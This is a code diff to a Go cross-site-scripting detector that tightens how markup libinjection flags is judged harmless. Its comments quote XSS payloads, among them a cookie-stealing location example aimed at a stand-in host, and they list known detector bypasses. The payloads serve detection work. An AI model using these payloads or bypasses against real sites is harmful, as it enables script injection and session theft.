@@ -669,6 +669,9 @@ var inertPlaceholderTags = [...]string{"link", "base", "object", "meta", "embed"
 //
 //   - the value has no NUL byte (libinjection skips NULs inside comment
 //     terminators and tag names, which this scan does not model).
+//   - the value holds no "<script", no javascript:/vbscript: and no
+//     on<event>= or formaction= attribute text anywhere (hasXSSMarker), so
+//     "<link> onload=alert(1)" and "<!--` onerror=alert(1)" stay caught.
 //   - at least one of these was masked (see maskInertMarkup):
 //     a backtick inside an HTML comment ("<!-- see the `main` branch -->",
 //     closed by "-->" or "-!>", or open to the end of the value) or inside
@@ -679,51 +682,113 @@ var inertPlaceholderTags = [...]string{"link", "base", "object", "meta", "embed"
 //     when no tag in the value has an attribute; or a "<!DOCTYPE" with no
 //     '>' and no '[' after it anywhere in the value (a mention, not a
 //     declaration: "<!DOCTYPE x [" opens an internal subset and stays).
+//     Comment backticks are not masked at all when the value opens a
+//     raw-text or form element (see hasCommentHidingOpener): inside
+//     "<title>" a browser reads "<!--" as text, so in
+//     "<title><!--</title><img src=x onerror=alert(1)>`-->" the image runs
+//     while libinjection sees a comment.
 //   - libinjection does not flag the masked value: a real tag, attribute,
 //     javascript: URL or IE conditional comment ("<!--[if") outside the
 //     masked bytes keeps the hit ("<!-- x --><img src=x onerror=alert(1)>",
 //     "<a href=`javascript:alert(1)`>").
-//   - when a comment backtick was masked, the text after the first one, read
-//     the way old IE would read it once the backtick ended the comment,
-//     holds no "<script", no javascript:/vbscript: and no on<event>=
-//     handler, and libinjection does not flag it alone, masked the same
-//     way (so a later comment backtick or a "<link>" placeholder inside the
-//     comment does not count against it). That keeps
-//     "<!--` onerror=alert(1)" and "<!-- `x` <img src=x onerror=alert(1)> -->".
+//   - when a comment backtick was masked, libinjection does not flag the
+//     masked value with every "<!--", "-->" and "-!>" blanked either, so
+//     markup inside a comment counts as live (old IE ended the comment at
+//     the backtick; "<!-->" closes at once in HTML5). A "<link>"
+//     placeholder inside the comment is masked again first.
 //
-// Accepted cost: a bare "<object>", "<link>" or "<base>" with no attribute
-// anywhere in the value is no longer flagged; it loads and runs nothing.
-// Cost: two masking passes and at most two more libinjection calls, only
-// for a value libinjection already flagged: linear.
+// Accepted misses of isXSS (the same list, word for word, is in
+// docs/threat-model.md and testdata/corpus/README.md; the test list is
+// xssInertMarkupAcceptedMisses):
+//
+//  1. A call after `javascript: k=v; ` with plain spaces before the name and
+//     the `(`, whose argument is one letter-only word that is no JS keyword
+//     or browser global, or words separated by blanks alone:
+//     `javascript: a=1; alert (x)`, `javascript: a=1; fetch (url)`. As a
+//     script it throws a ReferenceError or SyntaxError unless the page
+//     defines the name.
+//  2. A bare `<object>`, `<link>`, `<base>`, `<meta>` or `<embed>` with no
+//     attribute on any tag in the value: `<link>`, `<object><embed>`. It
+//     loads and runs nothing.
+//  3. A `<!DOCTYPE` with no `>` and no `[` after it: `<!DOCTYPE html`. A
+//     doctype runs nothing.
+//  4. A backtick inside an HTML comment or a bogus comment (`<!...>`,
+//     `<?...>`), when the value opens no raw-text or form element, holds no
+//     `<script`, `javascript:`, `vbscript:`, `on<event>=` or `formaction=`,
+//     and nothing in it is flagged by libinjection with the comments read
+//     as live markup: "<!-- `x` --><math href=//evil.example>x</math>" (a
+//     link, which libinjection does not flag without the comment either).
+//  5. A JavaScript-string breakout followed by an HTML comment holding a
+//     backtick: "';alert(1)//<!--`-->". libinjection has no JavaScript
+//     context, and the breakout without the comment was never flagged.
+//
+// Cost: three linear scans and at most two masking passes and two more
+// libinjection calls, only for a value libinjection already flagged.
 func isInertMarkup(s string) bool {
-	if strings.IndexByte(s, 0) >= 0 {
+	if strings.IndexByte(s, 0) >= 0 || hasXSSMarker(s) {
 		return false
 	}
-	m, tick, ok := maskInertMarkup(s)
+	m, tick, ok := maskInertMarkup(s, !hasCommentHidingOpener(s))
 	if !ok || libinjection.IsXSS(m) {
 		return false
 	}
 	if tick < 0 {
 		return true
 	}
-	if hasXSSMarker(s[tick+1:]) {
-		return false
-	}
-	rest, _, _ := maskInertMarkup(m[tick+1:])
-	return !libinjection.IsXSS(rest)
+	live, _, _ := maskInertMarkup(commentDelimiters.Replace(m), true)
+	return !libinjection.IsXSS(live)
 }
 
-// maskInertMarkup returns s with every backtick inside an HTML comment, the
-// '<' of every bare placeholder tag (only when no tag has an attribute) and
-// the '<' of every "<!DOCTYPE" with no '>' or '[' after it replaced by a
-// blank. tick is the index of the first masked backtick, or -1; ok reports
-// whether anything was masked. A comment opens at "<!--" and closes at the
-// first "-->" or "-!>" after it, and a bogus comment ("<!x", "<?x", not
-// "<!DOCTYPE" or "<![CDATA[") closes at the first '>', as libinjection's
-// tokenizer reads them. One pass over s:
+// commentDelimiters blanks HTML comment openers and closers, so that what a
+// comment holds is tokenized as live markup. Same length, so offsets hold.
+var commentDelimiters = strings.NewReplacer("<!--", "    ", "-->", "   ", "-!>", "   ")
+
+// commentHidingOpeners are elements whose content a browser does not parse
+// as markup (RCDATA, RAWTEXT, script data, plaintext), plus "form", whose
+// action libinjection does not flag. When one of them opens, a comment
+// backtick is not masked, so libinjection's verdict stands as it was.
+var commentHidingOpeners = [...]string{
+	"title", "textarea", "xmp", "noembed", "noframes", "plaintext",
+	"style", "script", "iframe", "noscript", "form",
+}
+
+// hasCommentHidingOpener reports whether s holds "<name" for a name in
+// commentHidingOpeners, case-insensitive, ended by a blank, '/', '>', '\f'
+// or the end of s ("<title>", "<TITLE x=1>", "<title/>", not "<titles>").
+// One pass: the scan resumes after each tag name.
+func hasCommentHidingOpener(s string) bool {
+	for i := strings.IndexByte(s, '<'); i >= 0; {
+		j := i + 1
+		for j < len(s) && isLetter(s[j]) {
+			j++
+		}
+		if j > i+1 && (j == len(s) || isBlank(s[j]) || s[j] == '/' || s[j] == '>' || s[j] == '\f') {
+			for _, t := range commentHidingOpeners {
+				if strings.EqualFold(s[i+1:j], t) {
+					return true
+				}
+			}
+		}
+		k := strings.IndexByte(s[j:], '<')
+		if k < 0 {
+			return false
+		}
+		i = j + k
+	}
+	return false
+}
+
+// maskInertMarkup returns s with every backtick inside an HTML comment
+// (only when comments is true), the '<' of every bare placeholder tag (only
+// when no tag has an attribute) and the '<' of every "<!DOCTYPE" with no
+// '>' or '[' after it replaced by a blank. tick is the index of the first
+// masked backtick, or -1; ok reports whether anything was masked. A comment
+// opens at "<!--" and closes at the first "-->" or "-!>" after it, and a
+// bogus comment ("<!x", "<?x", not "<!DOCTYPE" or "<![CDATA[") closes at
+// the first '>', as libinjection's tokenizer reads them. One pass over s:
 // each comment is searched once and the scan resumes after it, and one
 // search each for the last '>' and '[' answers every "<!DOCTYPE".
-func maskInertMarkup(s string) (masked string, tick int, ok bool) {
+func maskInertMarkup(s string, comments bool) (masked string, tick int, ok bool) {
 	tick = -1
 	var b []byte
 	set := func(i int) {
@@ -773,7 +838,7 @@ func maskInertMarkup(s string) (masked string, tick int, ok bool) {
 		if body < 0 {
 			continue
 		}
-		for k := body; k < end; k++ {
+		for k := body; comments && k < end; k++ {
 			if s[k] == '`' {
 				if tick < 0 {
 					tick = k
@@ -830,30 +895,63 @@ func isInertPlaceholderTag(name string) bool {
 }
 
 // hasXSSMarker reports whether s holds "<script", a javascript: or
-// vbscript: scheme, or an event-handler attribute: a word that starts with
-// "on" and another letter, then optional blanks and '='. Case-insensitive.
-// One pass plus two substring searches.
+// vbscript: scheme, or attribute text that runs or redirects: a word that
+// starts with "on" and another letter (an event handler) or the word
+// "formaction", then optional blanks and '=' (or "&#61", "&#x3d",
+// "&equals;", the character references for it). Case-insensitive. One pass
+// over the words plus three substring searches.
 func hasXSSMarker(s string) bool {
 	if indexFold(s, "<script") >= 0 || indexFold(s, "javascript:") >= 0 || indexFold(s, "vbscript:") >= 0 {
 		return true
 	}
 	for i := 0; i+2 < len(s); i++ {
-		if s[i]|0x20 != 'o' || s[i+1]|0x20 != 'n' || !isLetter(s[i+2]) || i > 0 && isIdentByte(s[i-1]) {
+		if !isLetter(s[i]) || i > 0 && isIdentByte(s[i-1]) {
 			continue
 		}
-		j := i + 2
+		j := i + 1
 		for j < len(s) && isIdentByte(s[j]) {
 			j++
 		}
-		for j < len(s) && isBlank(s[j]) {
-			j++
-		}
-		if j < len(s) && s[j] == '=' {
-			return true
+		w := s[i:j]
+		handler := len(w) > 2 && w[0]|0x20 == 'o' && w[1]|0x20 == 'n' && isLetter(w[2])
+		if handler || strings.EqualFold(w, "formaction") {
+			for j < len(s) && isBlank(s[j]) {
+				j++
+			}
+			if j < len(s) && (s[j] == '=' || isEqualsRef(s[j:])) {
+				return true
+			}
 		}
 		i = j - 1
 	}
 	return false
+}
+
+// isEqualsRef reports whether s starts with a character reference for '=':
+// "&#61", "&#x3d" (any case, leading zeros allowed) or "&equals;".
+func isEqualsRef(s string) bool {
+	if len(s) < 3 || s[0] != '&' {
+		return false
+	}
+	if strings.HasPrefix(s, "&equals;") {
+		return true
+	}
+	if s[1] != '#' {
+		return false
+	}
+	base, j := 10, 2
+	if s[2]|0x20 == 'x' {
+		base, j = 16, 3
+	}
+	v, n := 0, 0
+	for ; j < len(s) && n < 8; j, n = j+1, n+1 {
+		d := hexVal(s[j])
+		if d < 0 || d >= base {
+			break
+		}
+		v = v*base + d
+	}
+	return n > 0 && v == '='
 }
 
 // hasScriptTagAnywhere finds a "<script" opening tag that libinjection's
@@ -1142,7 +1240,7 @@ func hasCodeAfterAssign(rhs string) bool {
 			if rhs[j] == ';' && k == j+1 && k < len(rhs) {
 				return true
 			}
-			if k > j+1 && isCodeStatement(rhs[k:], rhs[j] == ';') {
+			if k > j+1 && isCodeStatement(rhs[k:], rhs[j] == ';', strings.Count(rhs[j+1:k], " ") == k-j-1) {
 				return true
 			}
 		}
@@ -1156,12 +1254,16 @@ func isBlank(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\
 // something: a dotted name assigned, called or indexed ("top.location=name",
 // "document.location='//x'"), a name called with blanks before '(' or
 // tagged with a template ("alert (1)", "alert`1`"; a blank before '(' only
-// counts after ';' and before code-shaped arguments, since "a=1, duration (2 weeks)" is prose), or a browser global
-// assigned a value that is not an inert word ("location=name",
+// counts after ';', since "a=1, duration (2 weeks)" is prose), or a browser
+// global assigned a value that is not an inert word ("location=name",
 // "location='//evil/?'+document.cookie"). "b=2", "maybe", "e.g. later" and
-// "name=Ali" are not, and neither is a blank-separated call whose argument
-// is not code-shaped (see isCodeArgs): "maybe (later)".
-func isCodeStatement(st string, afterSemi bool) bool {
+// "name=Ali" are not, and neither is a call after "; " with plain spaces
+// before the name and the '(' whose arguments read as prose (see
+// isCodeArgs): "maybe (later)". plainSemi reports whether only spaces
+// (0x20) separate the ';' from st; a tab or newline there, or before the
+// '(', is how code is laid out, not prose, and keeps the call code, as does
+// a callee that is a browser global or JS keyword ("location (x)").
+func isCodeStatement(st string, afterSemi, plainSemi bool) bool {
 	i, dotted := 0, false
 	for i < len(st) && (isIdentByte(st[i]) || st[i] == '$' || st[i] == '.') {
 		dotted = dotted || st[i] == '.'
@@ -1171,7 +1273,7 @@ func isCodeStatement(st string, afterSemi bool) bool {
 		return false
 	}
 	name := st[:i]
-	for i < len(st) && (st[i] == ' ' || st[i] == '\t') {
+	for i < len(st) && isBlank(st[i]) {
 		i++
 	}
 	if i >= len(st) {
@@ -1184,7 +1286,13 @@ func isCodeStatement(st string, afterSemi bool) bool {
 		if i == len(name) {
 			return true
 		}
-		return afterSemi && isCodeArgs(st[i+1:])
+		if !afterSemi {
+			return false
+		}
+		if !plainSemi || strings.Count(st[len(name):i], " ") != i-len(name) || isBrowserGlobal(name) || isJSKeyword(name) {
+			return true
+		}
+		return isCodeArgs(st[i+1:])
 	case '[':
 		return dotted
 	case '=':
@@ -1199,55 +1307,106 @@ func isCodeStatement(st string, afterSemi bool) bool {
 
 // isCodeArgs reports whether a, the text after the '(' of a call written
 // with a blank before it ("alert (1)"), reads as code arguments rather than
-// a parenthetical aside ("maybe (later)", "practise (daily)", "(2 days)"):
+// a parenthetical aside ("maybe (later)", "practise (daily)", "(2 days)").
+// The arguments read as prose only when both hold:
 //
-//   - empty: "alert ()".
-//   - a string, template, array or object literal: "alert ('x')",
-//     "alert (`x`)", "alert ([1])", "alert ({})".
-//   - a call or template inside: "alert (eval(name))".
-//   - a single number, dotted name or browser global, then ')', ',' or an
-//     operator, with an optional unary - + ! ~ before it: "alert (1)",
-//     "alert (-1)", "alert (!0)", "alert (document.cookie)", "alert (name)".
+//   - every byte up to the first ')' is a letter, a digit, a blank, '-' or
+//     ',' (a ')' must come). Any other byte (a quote, '.', '/', '\', '=',
+//     '(', '_', '$', ...) is code: "alert ('x')", "alert (x.y)".
+//   - the words (runs of letters and digits) are either exactly one
+//     letter-only word, with no '-' or ',' beside it, that is no JS keyword
+//     or browser global ("(later)", not "(this)", "(name)", "(cookie)",
+//     "(- x)"), or include two words separated
+//     by blanks alone, which cannot parse as JavaScript, with none of them a
+//     keyword ("(2 days)", "(-2 dollars)", "(see notes)", not "(new Image)",
+//     "(typeof x)", "(x in y)").
 //
-// "(-2 days)" and "(2 weeks)" have a blank and a word after the number and
-// are not code. A single plain word ("alert (x)", "fetch (url)", "alert (a,
-// b)") is prose-shaped and is not code; as a
-// script it throws a ReferenceError unless the page defines it (the
-// accepted cost). Reads one token: linear.
+// Everything else is code: "()", "(1)", "(0x1)", "(- x)", "(x - y)",
+// "(a, b)". A single plain word ("alert (x)", "fetch (url)") is the
+// accepted cost: as a script it throws a ReferenceError unless the page
+// defines it. The scan stops at the first ')' or the first byte outside the
+// prose set, and a ';' is outside it, so the calls from hasCodeAfterAssign
+// never read the same bytes twice: linear.
 func isCodeArgs(a string) bool {
-	i := 0
-	for i < len(a) && isBlank(a[i]) {
+	words, adjacent, punct := 0, false, false
+	var first string
+	prevWord, gapBlank := false, false // the last token was a word; only blanks since
+	for i := 0; i < len(a); {
+		c := a[i]
+		switch {
+		case c == ')':
+			if words == 1 && !punct {
+				return !isLetterWord(first) || isJSKeyword(first) || isArgGlobal(first)
+			}
+			return !adjacent
+		case isLetter(c) || isDigit(c):
+			j := i
+			for j < len(a) && (isLetter(a[j]) || isDigit(a[j])) {
+				j++
+			}
+			w := a[i:j]
+			if isJSKeyword(w) {
+				return true
+			}
+			if words == 0 {
+				first = w
+			}
+			if prevWord && gapBlank {
+				adjacent = true
+			}
+			words++
+			prevWord, gapBlank = true, false
+			i = j
+			continue
+		case isBlank(c):
+			gapBlank = gapBlank || prevWord
+		case c == '-' || c == ',':
+			prevWord, gapBlank, punct = false, false, true
+		default:
+			return true
+		}
 		i++
 	}
-	if i >= len(a) {
-		return false
+	return true // no ')': not a closed aside
+}
+
+// isLetterWord reports whether w is letters only.
+func isLetterWord(w string) bool {
+	for i := 0; i < len(w); i++ {
+		if !isLetter(w[i]) {
+			return false
+		}
 	}
-	switch a[i] {
-	case ')', '\'', '"', '`', '[', '{':
+	return true
+}
+
+// isJSKeyword reports whether w is a JavaScript reserved word or literal
+// name that an argument list can hold, including the keyword operators that
+// make two blank-separated words valid code ("new Image", "typeof x",
+// "x in y", "await 1").
+func isJSKeyword(w string) bool {
+	switch w {
+	case "new", "void", "typeof", "await", "delete", "yield", "in", "instanceof", "of",
+		"async", "function", "class", "this", "super", "null", "true", "false",
+		"undefined", "NaN", "Infinity", "arguments", "import", "let", "var", "const":
 		return true
-	case '-', '+', '!', '~':
-		i++ // a unary operator before the token: "alert (-1)", "alert (!0)"
 	}
-	start, dotted, digits := i, false, true
-	for i < len(a) && (isIdentByte(a[i]) || a[i] == '$' || a[i] == '.') {
-		dotted = dotted || a[i] == '.'
-		digits = digits && (isDigit(a[i]) || a[i] == '.')
-		i++
-	}
-	if i == start || i >= len(a) {
-		return false
-	}
-	if a[i] == '(' || a[i] == '`' {
+	return false
+}
+
+// isArgGlobal reports whether w is a browser global worth reading as an
+// argument: the navigating globals of isBrowserGlobal plus the stores and
+// names a payload exfiltrates or uses ("alert (cookie)", "alert (origin)").
+func isArgGlobal(w string) bool {
+	if isBrowserGlobal(w) {
 		return true
 	}
-	tok := a[start:i]
-	if !digits && !dotted && !isBrowserGlobal(tok) {
-		return false
+	switch w {
+	case "cookie", "origin", "localStorage", "sessionStorage", "history", "navigator",
+		"frames", "globalThis", "indexedDB", "crypto", "fetch", "alert", "eval":
+		return true
 	}
-	for i < len(a) && isBlank(a[i]) {
-		i++
-	}
-	return i < len(a) && strings.IndexByte("),+-*/", a[i]) >= 0
+	return false
 }
 
 // decodeWhitespaceRefs replaces the HTML character references for tab, LF
